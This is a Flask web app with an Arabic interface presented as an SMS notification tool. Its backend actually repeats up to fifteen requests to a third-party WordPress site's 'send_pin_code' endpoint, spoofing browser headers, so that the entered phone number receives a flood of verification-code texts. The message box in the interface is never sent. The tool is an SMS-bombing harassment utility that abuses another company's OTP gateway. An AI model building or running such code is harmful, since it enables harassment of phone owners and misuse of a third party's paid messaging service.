from flask import Flask, render_template_string, request, jsonify
import requests

app = Flask(__name__)

# نفس الواجهة التي أعجبتك مع تعديل بسيط في JavaScript
HTML_UI = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMS Pro</title>
    <style>
        body { background: #f4f7ff; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 25px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); width: 90%; max-width: 380px; text-align: center; }
        .header-icon { background: #eff2fe; width: 60px; height: 60px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px; font-size: 25px; color: #6366f1; }
        h2 { color: #333; margin-bottom: 5px; }
        p { color: #999; font-size: 13px; margin-bottom: 25px; }
        .input-group { text-align: right; margin-bottom: 15px; }
        label { display: block; font-size: 12px; font-weight: bold; color: #666; margin-bottom: 8px; }
        input[type="text"] { width: 100%; padding: 12px; border: 1px solid #eee; border-radius: 12px; box-sizing: border-box; background: #fafafa; text-align: center; }
        .slider-container { margin: 20px 0; }
        .slider { width: 100%; accent-color: #6366f1; cursor: pointer; }
        .count-badge { background: #6366f1; color: white; padding: 2px 10px; border-radius: 10px; font-size: 12px; float: left; }
        button { width: 100%; padding: 15px; background: #6366f1; color: white; border: none; border-radius: 15px; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.3s; box-shadow: 0 4px 15px rgba(99, 102, 241, 0.3); }
        .status-msg { margin-top: 15px; font-size: 13px; padding: 10px; border-radius: 10px; background: #f0fdf4; border: 1px solid #bbf7d0; display: none; }
    </style>
</head>
<body>
    <div class="card">
        <div class="header-icon">✉️</div>
        <h2>إرسال الرسائل</h2>
        <p>أداة سريعة وآمنة لإرسال الإشعارات</p>
        <div class="input-group">
            <label>رقم الهاتف</label>
            <input type="text" id="phone" placeholder="07xxxxxxxx">
        </div>
        <div class="input-group">
            <label>نص الرسالة</label>
            <input type="text" id="msg" value="مرحباً">
        </div>
        <div class="slider-container">
            <span class="count-badge" id="rangeValue">1</span>
            <label>عدد الرسائل</label>
            <input type="range" id="count" class="slider" min="1" max="15" value="1" oninput="document.getElementById('rangeValue').innerText = this.value">
        </div>
        <button id="sendBtn" onclick="startSending()">إرسال الآن 🚀</button>
        <div id="status" class="status-msg"></div>
    </div>

    <script>
        async function startSending() {
            const phone = document.getElementById('phone').value;
            const count = document.getElementById('count').value;
            const status = document.getElementById('status');
            if(!phone) return alert("أدخل الرقم");
            
            status.style.display = 'block';
            let success = 0; let fail = 0;

            for(let i=1; i<=count; i++) {
                status.innerText = `جاري إرسال ${i} من ${count}...`;
                try {
                    const r = await fetch('/api/send', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({phone})
                    });
                    const res = await r.json();
                    if(res.ok) success++; else fail++;
                } catch { fail++; }
                status.innerText = `تم الانتهاء! نجح: ${success} | فشل: ${fail}`;
            }
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index(): return render_template_string(HTML_UI)

@app.route('/api/send', methods=['POST'])
def send_api():
    phone = request.json.get('phone')
    # الرابط الحقيقي للبوابة مع المحاكاة
    url = "https://pashacards.net/wp-admin/admin-ajax.php"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest"
    }
    payload = {
        "action": "send_pin_code",
        "msisdn": phone,
        "appId": "1"
    }
    try:
        # قمنا بتغيير json إلى data لأن الموقع الأصلي يستقبل الطلبات بصيغة Form
        r = requests.post(url, headers=headers, data=payload, timeout=10)
        # إذا كان الرد يحتوي على كلمة success أو status 200
        return jsonify({"ok": r.status_code == 200})
    except:
        return jsonify({"ok": False})

if __name__ == '__main__':
    app.run()
